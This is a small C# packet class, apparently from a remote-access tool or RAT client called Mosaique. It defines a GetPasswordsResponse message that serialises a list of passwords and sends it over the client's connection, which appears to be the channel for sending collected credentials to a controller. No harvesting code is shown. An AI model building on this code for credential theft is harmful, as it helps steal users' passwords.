using Client.Controllers;
using System.Collections.Generic;
using ZeroFormatter;

namespace Client.Packets.ClientPackets
{
    [ZeroFormattable]
    public class GetPasswordsResponse : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetPasswordsResponse;
            }
        }

        [Index(0)]
        public virtual List<string> passwords { get; set; }

        public GetPasswordsResponse()
        {
        }

        public GetPasswordsResponse(List<string> data)
        {
            this.passwords = data;
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
